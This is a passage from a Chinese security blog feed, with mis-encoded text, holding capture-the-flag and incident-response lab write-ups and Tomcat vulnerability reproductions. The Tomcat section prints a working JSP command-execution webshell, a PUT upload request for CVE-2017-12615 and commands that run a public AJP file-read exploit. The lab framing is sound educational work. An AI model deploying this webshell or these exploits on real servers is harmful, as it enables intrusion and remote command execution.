title="1ã€æŸ¥çœ‹&#x2F;etc&#x2F;passwd"></a>1ã€æŸ¥çœ‹&#x2F;etc&#x2F;passwd</h3><p>é™¤äº†<code>shailendra</code>ç”¨æˆ·ä¹‹å¤–ï¼Œè¿˜å­˜åœ¨ä¸€ä¸ª<code>centos</code>ç”¨æˆ·</p><p><img src="/img/OSCP-cybersploit-2/image-20240527142634078.png" alt="image-20240527142634078"></p><h3 id="2ã€hint-txt"><a href="#2ã€hint-txt" class="headerlink" title="2ã€hint.txt"></a>2ã€hint.txt</h3><p>è¿™ä¸ªæç¤ºç»™çš„æ˜¯æ·±å¤„dockerå½“ä¸­å—</p><p><img src="/img/OSCP-cybersploit-2/image-20240527142719157.png" alt="image-20240527142719157"></p><p>æŸ¥çœ‹æ ¹ç›®å½•ä¸‹æ˜¯å¦æœ‰<code>.dockerenv</code>æ–‡ä»¶</p><p><img src="/img/OSCP-cybersploit-2/image-20240527142922493.png" alt="image-20240527142922493"></p><p>è™½ç„¶å¹¶æœªèº«å¤„dockerå½“ä¸­ï¼Œä½†æ˜¯è¿™ä¸ªæœºå™¨å´æœ‰dockerç¯å¢ƒï¼Œç”šè‡³è¿˜æœ‰å‡ ä¸ªå®¹å™¨å­˜åœ¨</p><p><img src="/img/OSCP-cybersploit-2/image-20240527143037623.png" alt="image-20240527143037623"></p><h3 id="3ã€ææƒè‡³root"><a href="#3ã€ææƒè‡³root" class="headerlink" title="3ã€ææƒè‡³root"></a>3ã€ææƒè‡³root</h3><p>ç›´æ¥åˆ©ç”¨dockerä¸€å¥è¯ææƒ</p>]]></content>
      
      
      <categories>
          
          <category> OSCPç³»åˆ—é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€åº”æ€¥é¶åœºã€‘WinServer 2008è¿‘æºåº”æ€¥OS-1</title>
      <link href="/2024/05/26/Emergency-Nearsource-os-1/"/>
      <url>/2024/05/26/Emergency-Nearsource-os-1/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows-Server-2008è¿‘æºåº”æ€¥OS-1"><a href="#Windows-Server-2008è¿‘æºåº”æ€¥OS-1" class="headerlink" title="Windows Server 2008è¿‘æºåº”æ€¥OS-1"></a>Windows Server 2008è¿‘æºåº”æ€¥OS-1</h1><p><strong>å‰æ™¯éœ€è¦ï¼š</strong>å°ç‹ä»æŸå®‰å…¨å¤§å‚è¢«ä¼˜åŒ–æ‰åï¼Œæ¥åˆ°äº†æŸç§ç«‹å°å­¦å½“èµ·äº†è®¡ç®—æœºè€å¸ˆã€‚æŸä¸€å¤©ä¸Šè¯¾çš„æ—¶å€™ï¼Œå‘ç°é¼ æ ‡åœ¨è‡ªå·±åŠ¨å¼¹ï¼Œåˆå‘ç°é™¤äº†æŸå°ç”µè„‘ï¼Œå…¶ä»–ç”µè„‘è¿ä¸ä¸Šç½‘ç»œã€‚æ„Ÿè§‰è‚¯å®šæœ‰å­¦ç”Ÿæ£ä¹±ï¼Œäºæ˜¯å¼€å¯äº†åº”æ€¥ã€‚</p><ol><li>æ”»å‡»è€…çš„å¤–ç½‘IPåœ°å€</li><li>æ”»å‡»è€…çš„å†…ç½‘è·³æ¿IPåœ°å€</li><li>æ”»å‡»è€…ä½¿ç”¨çš„é™é€Ÿè½¯ä»¶çš„md5å¤§å†™</li><li>æ”»å‡»è€…çš„åé—¨md5å¤§å†™</li><li>æ”»å‡»è€…ç•™ä¸‹çš„flag</li></ol><h2 id="ä¸€ã€ç¯å¢ƒé…ç½®"><a href="#ä¸€ã€ç¯å¢ƒé…ç½®" class="headerlink" title="ä¸€ã€ç¯å¢ƒé…ç½®"></a>ä¸€ã€ç¯å¢ƒé…ç½®</h2><p>åœ¨ç½‘ç›˜ä¸­ä¸‹è½½è¯¥é¶åœºï¼Œè§£å‹ååœ¨vmä¸­é€‰æ‹©ã€æ‰«æè™šæ‹Ÿæœºã€‘ï¼Œé€‰æ‹©å¯¹åº”çš„æ–‡ä»¶å¤¹æ‰“å¼€å³å¯</p><p><img src="/img/Emergency-Nearsource-os-1/image-20240524195332592.png" alt="image-20240524195332592"></p><h2 id="äºŒã€æ”»å‡»è€…çš„å¤–ç½‘IPåœ°å€"><a href="#äºŒã€æ”»å‡»è€…çš„å¤–ç½‘IPåœ°å€" class="headerlink" title="äºŒã€æ”»å‡»è€…çš„å¤–ç½‘IPåœ°å€"></a>äºŒã€æ”»å‡»è€…çš„å¤–ç½‘IPåœ°å€</h2><p>è¿™æ˜¯ä¸€ä¸ªè¢«è¿‘æºçš„ä¸»æœºï¼Œå› æ­¤å¯èƒ½æƒ³åˆ°çš„æ˜¯è¢«é’“é±¼äº†</p><p><img src="/img/Emergency-Nearsource-os-1/image-20240526160712317.png" alt="image-20240526160712317"></p><p>ä½œä¸ºä¸€åè€å¸ˆï¼Œæ¡Œé¢ä¸Šçš„<code>å­¦æ ¡æ”¾å‡é€šçŸ¥.doc</code>ç¡®æ˜¯è¯±æƒ‘çš„ä¸€æ‰¹</p><p><img src="/img/Emergency-Nearsource-os-1/image-20240526162025296.png" alt="image-20240526162025296"></p><p>åœ¨æ²™ç®±ä¸­è·‘ä¸€ä¸‹ï¼Œå‡ºæ¥å¤–ç½‘IP</p><h2 id="ä¸‰ã€æ”»å‡»è€…çš„å†…ç½‘è·³æ¿IPåœ°å€"><a href="#ä¸‰ã€æ”»å‡»è€…çš„å†…ç½‘è·³æ¿IPåœ°å€" class="headerlink" title="ä¸‰ã€æ”»å‡»è€…çš„å†…ç½‘è·³æ¿IPåœ°å€"></a>ä¸‰ã€æ”»å‡»è€…çš„å†…ç½‘è·³æ¿IPåœ°å€</h2><p>æ¡Œé¢ä¸Šå­˜åœ¨ä¸€ä¸ªphpstudy ä¿®å¤çš„bat æ–‡ä»¶ï¼Œä½†æ˜¯å…¶ç›®æ ‡å±…ç„¶æ˜¯å¦ä¸€ä¸ªbat</p><p><img src="/img/Emergency-Nearsource-os-1/image-20240526162233825.png" alt="image-20240526162233825"></p><p>æ‰¾åˆ°å…¶ä½ç½®å±…ç„¶å•¥ä¹Ÿæ²¡æœ‰ï¼Œæ‰“å¼€å¦‚ä¸‹ä¸¤ä¸ªé€‰é¡¹</p><p><img src="/img/Emergency-Nearsource-os-1/image-20240526162450318.png" alt="image-20240526162450318"></p><p>æŸ¥çœ‹å…¶å†…å®¹ï¼Œå†…ç½‘IP<code>192.168.20.129</code>ï¼Œç«¯å£801</p><p><img src="/img/Emergency-Nearsource-os-1/image-20240526162521917.png" alt="image-20240526162521917"></p><h2 id="å››ã€æ”»å‡»è€…ä½¿ç”¨çš„é™é€Ÿè½¯ä»¶çš„md5å¤§å†™"><a href="#å››ã€æ”»å‡»è€…ä½¿ç”¨çš„é™é€Ÿè½¯ä»¶çš„md5å¤§å†™" class="headerlink" title="å››ã€æ”»å‡»è€…ä½¿ç”¨çš„é™é€Ÿè½¯ä»¶çš„md5å¤§å†™"></a>å››ã€æ”»å‡»è€…ä½¿ç”¨çš„é™é€Ÿè½¯ä»¶çš„md5å¤§å†™</h2><p>åœ¨å¦‚ä¸‹çš„ä½ç½®</p><p><img src="/img/Emergency-Nearsource-os-1/image-20240526162731280.png" alt="image-20240526162731280"></p><p>å¯¹è¯¥å·¥å…·çš„ç®€è¿°ï¼šé™åˆ¶åˆ«äººç½‘é€Ÿ</p><img src="/img/Emergency-Nearsource-os-1/image-20240526162814273.png" alt="image-20240526162814273" style="zoom:150%;" /><p>åœ¨çº¿ç½‘ç«™è®¡ç®—ç»™å·¥å…·çš„MD5ï¼Œåé¢è½¬æˆå¤§å†™å³å¯</p><p><img src="/img/Emergency-Nearsource-os-1/image-20240526162934033.png" alt="image-20240526162934033"></p><h2 id="äº”ã€æ”»å‡»è€…çš„åé—¨md5å¤§å†™"><a href="#äº”ã€æ”»å‡»è€…çš„åé—¨md5å¤§å†™" class="headerlink" title="äº”ã€æ”»å‡»è€…çš„åé—¨md5å¤§å†™"></a>äº”ã€æ”»å‡»è€…çš„åé—¨md5å¤§å†™</h2><p>è¿™ä¸ªåé—¨æœ¬ä»¥ä¸ºæ˜¯æ–‡ä»¶åé—¨ï¼ŒåŸæ¥æ˜¯äº”æ¬¡shift çš„åé—¨</p><p>äº”æ¬¡shfit åé—¨åŸç†æ˜¯æ›¿æ¢<code>C:\windows\system32\sethc.exe</code> æ–‡ä»¶ï¼Œå–è¯¥æ–‡ä»¶çš„md5å¤§å†™å³å¯</p><p><img src="/img/Emergency-Nearsource-os-1/image-20240526163930460.png" alt="image-20240526163930460"></p><p><img src="/img/Emergency-Nearsource-os-1/image-20240526163955586.png" alt="image-20240526163955586"></p><h2 id="å…­ã€æ”»å‡»è€…ç•™ä¸‹çš„flag"><a href="#å…­ã€æ”»å‡»è€…ç•™ä¸‹çš„flag" class="headerlink" title="å…­ã€æ”»å‡»è€…ç•™ä¸‹çš„flag"></a>å…­ã€æ”»å‡»è€…ç•™ä¸‹çš„flag</h2><p>å³äº”æ¬¡shift ä¹‹åå‡ºç°çš„flag</p><p><img src="/img/Emergency-Nearsource-os-1/image-20240526163508759.png" alt="image-20240526163508759"></p><h2 id="ä¸ƒã€è§£é¢˜"><a href="#ä¸ƒã€è§£é¢˜" class="headerlink" title="ä¸ƒã€è§£é¢˜"></a>ä¸ƒã€è§£é¢˜</h2><img src="/img/Emergency-Nearsource-os-1/image-20240526164326272.png" alt="image-20240526164326272" style="zoom:150%;" />]]></content>
      
      
      <categories>
          
          <category> åº”æ€¥é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å…¥ä¾µæ’æŸ¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€æ¼æ´å¤ç°ã€‘Tomcat ç³»åˆ—æ¼æ´å¤ç°</title>
      <link href="/2024/05/24/VulnRep-Tomcat/"/>
      <url>/2024/05/24/VulnRep-Tomcat/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€æ¼æ´å¤ç°ã€‘Tomcat-ç³»åˆ—æ¼æ´å¤ç°"><a href="#ã€æ¼æ´å¤ç°ã€‘Tomcat-ç³»åˆ—æ¼æ´å¤ç°" class="headerlink" title="ã€æ¼æ´å¤ç°ã€‘Tomcat ç³»åˆ—æ¼æ´å¤ç°"></a>ã€æ¼æ´å¤ç°ã€‘Tomcat ç³»åˆ—æ¼æ´å¤ç°</h1><h2 id="ä¸€ã€ä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼ˆtomcat8ï¼‰"><a href="#ä¸€ã€ä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼ˆtomcat8ï¼‰" class="headerlink" title="ä¸€ã€ä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼ˆtomcat8ï¼‰"></a>ä¸€ã€ä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼ˆtomcat8ï¼‰</h2><h3 id="1ã€æ¼æ´åŸå› "><a href="#1ã€æ¼æ´åŸå› " class="headerlink" title="1ã€æ¼æ´åŸå› "></a>1ã€æ¼æ´åŸå› </h3><p>Tomcatæ”¯æŒåœ¨åå°éƒ¨ç½²waræ–‡ä»¶ï¼Œå¯ä»¥ç›´æ¥å°†webshelléƒ¨ç½²åˆ°webç›®å½•ä¸‹ã€‚å…¶ä¸­ï¼Œæ¬²è®¿é—®åå°ï¼Œéœ€è¦å¯¹åº”ç”¨æˆ·æœ‰ç›¸åº”æƒé™ã€‚Tomcat7+æƒé™åˆ†ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">- managerï¼ˆåå°ç®¡ç†ï¼‰</span><br><span class="line">  - manager-gui æ‹¥æœ‰htmlé¡µé¢æƒé™</span><br><span class="line">  - manager-status æ‹¥æœ‰æŸ¥çœ‹statusçš„æƒé™</span><br><span class="line">  - manager-script æ‹¥æœ‰textæ¥å£çš„æƒé™ï¼Œå’Œstatusæƒé™</span><br><span class="line">  - manager-jmx æ‹¥æœ‰jmxæƒé™ï¼Œå’Œstatusæƒé™</span><br><span class="line">- host-managerï¼ˆè™šæ‹Ÿä¸»æœºç®¡ç†ï¼‰</span><br><span class="line">  - admin-gui æ‹¥æœ‰htmlé¡µé¢æƒé™</span><br><span class="line">  - admin-script æ‹¥æœ‰textæ¥å£æƒé™</span><br></pre></td></tr></table></figure><p>æ­£å¸¸å®‰è£…çš„æƒ…å†µä¸‹ï¼Œtomcat8ä¸­é»˜è®¤æ²¡æœ‰ä»»ä½•ç”¨æˆ·ï¼Œä¸”manageré¡µé¢åªå…è®¸æœ¬åœ°IPè®¿é—®ã€‚åªæœ‰ç®¡ç†å‘˜æ‰‹åŠ¨ä¿®æ”¹äº†è¿™äº›å±æ€§çš„æƒ…å†µä¸‹ï¼Œæ‰å¯ä»¥è¿›è¡Œæ”»å‡»ã€‚</p><h3 id="2ã€æ¼æ´å¤ç°"><a href="#2ã€æ¼æ´å¤ç°" class="headerlink" title="2ã€æ¼æ´å¤ç°"></a>2ã€æ¼æ´å¤ç°</h3><p>1ã€å¼±å£ä»¤<code>tomcat:tomcat</code>è®¿é—®åå°</p><p><img src="/img/VulnRep-Tomcat/image-20240524144345487.png" alt="image-20240524144345487"></p><p>2ã€ä¸Šä¼ webshell</p><p>å°†å¦‚ä¸‹shell.jsp å‹ç¼©æˆzipï¼Œå†ä¿®æ”¹åç¼€ä¸ºwar</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span><br><span class="line">        int a = -1;</span><br><span class="line">        byte[] b = new byte[2048];</span><br><span class="line">        out.print(&quot;pre&quot;);</span><br><span class="line">        while((a=in.read(b))!=-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;/pre&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Tomcat/image-20240524144716290.png" alt="image-20240524144716290"></p><p>3ã€æ‰§è¡Œå‘½ä»¤</p><p><img src="/img/VulnRep-Tomcat/image-20240524144805697.png" alt="image-20240524144805697"></p><h2 id="äºŒã€PUTæ–¹æ³•å†™å…¥ä»»æ„æ–‡ä»¶ï¼ˆCVE-2017-12615ï¼‰"><a href="#äºŒã€PUTæ–¹æ³•å†™å…¥ä»»æ„æ–‡ä»¶ï¼ˆCVE-2017-12615ï¼‰" class="headerlink" title="äºŒã€PUTæ–¹æ³•å†™å…¥ä»»æ„æ–‡ä»¶ï¼ˆCVE-2017-12615ï¼‰"></a>äºŒã€PUTæ–¹æ³•å†™å…¥ä»»æ„æ–‡ä»¶ï¼ˆCVE-2017-12615ï¼‰</h2><h3 id="1ã€æ¼æ´åŸå› -1"><a href="#1ã€æ¼æ´åŸå› -1" class="headerlink" title="1ã€æ¼æ´åŸå› "></a>1ã€æ¼æ´åŸå› </h3><p>è¯¥ç‰ˆæœ¬Tomcaté…ç½®äº†å¯å†™ï¼ˆreadonly&#x3D;falseï¼‰ï¼Œå¯¼è‡´æˆ‘ä»¬å¯ä»¥å¾€æœåŠ¡å™¨å†™æ–‡ä»¶</p><h3 id="2ã€å½±å“ç‰ˆæœ¬"><a href="#2ã€å½±å“ç‰ˆæœ¬" class="headerlink" title="2ã€å½±å“ç‰ˆæœ¬"></a>2ã€å½±å“ç‰ˆæœ¬</h3><p>Apache Tomcat 7.0.0 - 7.0.81</p><h3 id="3ã€æ¼æ´å¤ç°"><a href="#3ã€æ¼æ´å¤ç°" class="headerlink" title="3ã€æ¼æ´å¤ç°"></a>3ã€æ¼æ´å¤ç°</h3><p>1ã€é¦–é¡µ</p><p><img src="/img/VulnRep-Tomcat/image-20240524145153634.png" alt="image-20240524145153634"></p><p>2ã€æŠ“åŒ…ä¿®æ”¹è¯·æ±‚ä¸ºPUT</p><p>åå°å¯¹æ–‡ä»¶åç¼€è¿˜æ˜¯æœ‰ä¸€å®šé™åˆ¶çš„ï¼Œæ­¤å¤„åˆ©ç”¨linuxç‰¹æ€§ï¼Œåœ¨æ–‡ä»¶ååç¼€åŠ ä¸Š&#x2F; å³å¯ç»•è¿‡ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">PUT /shell.jsp/ HTTP/1.1</span><br><span class="line">Host: xxx.xxx.xxx.xxx:xxxx</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span><br><span class="line">        int a = -1;</span><br><span class="line">        byte[] b = new byte[2048];</span><br><span class="line">        out.print(&quot;pre&quot;);</span><br><span class="line">        while((a=in.read(b))!=-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;/pre&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Tomcat/image-20240524145600653.png" alt="image-20240524145600653"></p><p>3ã€æ‰§è¡Œå‘½ä»¤</p><p><img src="/img/VulnRep-Tomcat/image-20240524145644511.png" alt="image-20240524145644511"></p><h2 id="ä¸‰ã€æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆCVE-2020-1938ï¼‰"><a href="#ä¸‰ã€æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆCVE-2020-1938ï¼‰" class="headerlink" title="ä¸‰ã€æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆCVE-2020-1938ï¼‰"></a>ä¸‰ã€æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆCVE-2020-1938ï¼‰</h2><h3 id="1ã€æ¼æ´åŸå› -2"><a href="#1ã€æ¼æ´åŸå› -2" class="headerlink" title="1ã€æ¼æ´åŸå› "></a>1ã€æ¼æ´åŸå› </h3><p>Tomcaté»˜è®¤å¼€å¯AJPæœåŠ¡ï¼ˆ8009ç«¯å£ï¼‰ï¼Œå­˜åœ¨ä¸€å¤„æ–‡ä»¶åŒ…å«ç¼ºé™·ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ çš„æ¶æ„è¯·æ±‚åŒ…æ¥è¿›è¡Œæ–‡ä»¶åŒ…å«æ“ä½œï¼Œä»è€Œè¯»å–æˆ–åŒ…å«Tomcatä¸Šæ‰€æœ‰webappç›®å½•ä¸‹çš„ä»»æ„æ–‡ä»¶ï¼Œå¦‚ï¼šwebappé…ç½®æ–‡ä»¶æˆ–æºä»£ç ç­‰ã€‚å¦‚æœæ­¤æ—¶è¿˜å­˜åœ¨æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œåˆ™å¯èƒ½ä¼šå¯¼è‡´ä»£ç æ‰§è¡Œã€‚</p><p>tomcaté»˜è®¤çš„conf&#x2F;server.xmlä¸­é…ç½®äº†2ä¸ªConnectorï¼Œä¸€ä¸ªä¸º8080çš„å¯¹å¤–æä¾›çš„HTTPåè®®ç«¯å£ï¼Œå¦å¤–ä¸€ä¸ªå°±æ˜¯é»˜è®¤çš„8009 AJPåè®®ç«¯å£ï¼Œä¸¤ä¸ªç«¯å£é»˜è®¤å‡ç›‘å¬åœ¨å¤–ç½‘ipã€‚</p><h3 id="2ã€å½±å“ç‰ˆæœ¬-1"><a href="#2ã€å½±å“ç‰ˆæœ¬-1" class="headerlink" title="2ã€å½±å“ç‰ˆæœ¬"></a>2ã€å½±å“ç‰ˆæœ¬</h3><ul><li>Apache Tomcat 6</li><li>Apache Tomcat 7 &lt; 7.0.100</li><li>Apache Tomcat 8 &lt; 8.5.51</li><li>Apache Tomcat 9 &lt; 9.0.31</li></ul><p>ä¸å—å½±å“ç‰ˆæœ¬ï¼š</p><ul><li>Apache Tomcat 7.0.10034</li><li>Apache Tomcat 8.5.5134</li><li>Apache Tomcat 9.0.3134</li></ul><h3 id="3ã€æ¼æ´å¤ç°-1"><a href="#3ã€æ¼æ´å¤ç°-1" class="headerlink" title="3ã€æ¼æ´å¤ç°"></a>3ã€æ¼æ´å¤ç°</h3><p>1ã€å¯ç”¨nmap æ‰«è¿™ä¸¤ä¸ªç«¯å£</p><p><img src="/img/VulnRep-Tomcat/image-20240524151619712.png" alt="image-20240524151619712"></p><p>2ã€æ¼æ´å¤ç°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</span><br><span class="line">cd CNVD-2020-10487-Tomcat-Ajp-lfi/</span><br><span class="line">chmod +x CNVD-2020-10487-Tomcat-Ajp-lfi.py</span><br><span class="line">python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.1.9 -p 8009 -f WEB-INF/web.xml</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Tomcat/image-20240524152014946.png" alt="image-20240524152014946"></p><p>æ­¤é¶åœºæ— æ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½ï¼Œå¯ä»¥æ‰‹åŠ¨è¿›å…¥å®¹å™¨ä¸­å†™å…¥ä¸€ä¸ªwebshellï¼Œä¹‹ååŒ…å«ï¼Œå³å¯getshellã€‚</p>]]></content>
      
      
      <categories>
          
          <category> å¤ç°ä¸å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tomcatç³»åˆ— </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€åŸºç¡€çŸ¥è¯†ã€‘Javaç›¸å…³åè¯</title>
      <link href="/2024/05/23/Nouns-Java/"/>
      <url>/2024/05/23/Nouns-Java/</url>
      
        <content type="html"><![CDATA[<h1 id="Javaç›¸å…³åè¯"><a href="#Javaç›¸å…³åè¯" class="headerlink" title="Javaç›¸å…³åè¯"></a>Javaç›¸å…³åè¯</h1><h2 id="ä¸€ã€Java-å¼€å‘åè¯"><a href="#ä¸€ã€Java-å¼€å‘åè¯" class="headerlink" title="ä¸€ã€Java å¼€å‘åè¯"></a>ä¸€ã€Java å¼€å‘åè¯</h2><p>Java 2 æ ‡å‡†ç‰ˆï¼ˆJ2SEï¼‰ æ¡Œé¢ï¼ŒjavaåŸºç¡€åŠå…¶æ ¸å¿ƒï¼Œä¸»è¦å¼€å‘æ¡Œé¢ç¨‹åºæˆ–æ§åˆ¶ç¨‹åºã€‚</p><p>Java 2 ç§»åŠ¨ç‰ˆï¼ˆJ2MEï¼‰ç§»åŠ¨ç«¯ã€æ‰‹æœºï¼ŒåµŒå…¥å¼å¼€å‘ã€‚</p><p>Java 2 ä¼ä¸šç‰ˆï¼ˆJ2EEï¼‰ä¼ä¸šç‰ˆã€æœåŠ¡å™¨ï¼Œwebç«¯å¼€å‘ã€‚</p><h2 id="äºŒã€Java-è·¨å¹³å°"><a href="#äºŒã€Java-è·¨å¹³å°" class="headerlink" title="äºŒã€Java è·¨å¹³å°"></a>äºŒã€Java è·¨å¹³å°</h2><p>JVM : å®ç°çœŸæ­£çš„å¯ç§»æ¤æ€§ï¼Œåªè¦å®‰è£…äº†JVMçš„åœ°æ–¹éƒ½å¯ä»¥è¿è¡ŒJavaç¨‹åºã€‚</p><h2 id="ä¸‰ã€Java-å·¥å…·"><a href="#ä¸‰ã€Java-å·¥å…·" class="headerlink" title="ä¸‰ã€Java å·¥å…·"></a>ä¸‰ã€Java å·¥å…·</h2><p>æ„å»ºå·¥å…·ï¼šMavenã€Jekinsã€Ant</p><p>åº”ç”¨æœåŠ¡å™¨ï¼šTomcatã€Jettyã€Jbossã€Websphereã€Weblogic</p><p>Webå¼€å‘ï¼šstruts2ã€springã€myBatis</p><p>Hadoop å¤§æ•°æ®é¢†åŸŸ ã€Android æ‰‹æœºç«¯</p><p>JavaåŠ¨æ€æ€§â€“&gt;åå°„ ï¼Œå¤§å¤šæ¡†æ¶åŸºæœ¬éƒ½åŸºäºåå°„</p><p>JDK :Java Development Kit Javaå¼€å‘è€…å·¥å…·</p><p>JRE: Java Runtime Environment Javaè¿è¡Œç¯å¢ƒ</p><p>JVM : Java Virtual Machine Javaè™šæ‹Ÿæœº</p><p>JDKåŒ…å«JREåŒ…å«JVMã€‚Javaã€Javacç¼–è¯‘è¿è¡ŒJavaç¨‹åºï¼ŒJavadocå¯ä»¥ç”Ÿæˆdocæ–‡æ¡£ï¼Œjarå¯ä»¥ç”Ÿæˆ.jarçš„åº”ç”¨ç¨‹åºã€‚</p><p>è¿è¡ŒJavaç¨‹åºéœ€è¦JREç¯å¢ƒï¼Œç¨‹åºè¿è¡Œæ—¶ä¼šåœ¨JVMä¸­è¿è¡Œï¼Œæ‰€ä»¥å®ç°äº†Javaçš„å¯ç§»æ¤æ€§ã€‚javaç±»åˆå§‹åŒ–çš„æ—¶å€™è°ƒç”¨java.lang.ClassLoaderåŠ è½½å­—èŠ‚ç æ–‡ä»¶ã€‚</p><h2 id="å››ã€JDK-çš„ç›®å½•"><a href="#å››ã€JDK-çš„ç›®å½•" class="headerlink" title="å››ã€JDK çš„ç›®å½•"></a>å››ã€JDK çš„ç›®å½•</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bin : å­˜æ”¾Javaè¿è¡Œå·¥å…·ï¼Œå¦‚javac.exeã€jar.exe</span><br><span class="line">inclue : å› ä¸ºJavaæ˜¯cã€c++è¯­è¨€ç¼–å†™çš„ï¼Œè¿™é‡Œå­˜æ”¾äº†å¾ˆå¤šéœ€è¦å¼•ç”¨çš„cåº“</span><br><span class="line">jre : Javaè¿è¡Œæ‰€éœ€ç¯å¢ƒï¼ŒåŒ…å«JVM</span><br><span class="line">lib : Javaç±»åº“</span><br><span class="line">src.zip : èµ„æºæ–‡ä»¶ï¼Œæ”¾äº†å¾ˆå¤šJavaç±»çš„æºä»£ç </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> åŸºç¡€çŸ¥è¯† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŸºç¡€çŸ¥è¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€æ¼æ´å¤ç°ã€‘Spring ç³»åˆ—æ¼æ´å¤ç°ï¼ˆå…¨æ¼æ´ç‰ˆæœ¬ï¼‰</title>
      <link href="/2024/05/23/VulnRep-Spring/"/>
      <url>/2024/05/23/VulnRep-Spring/</url>
      
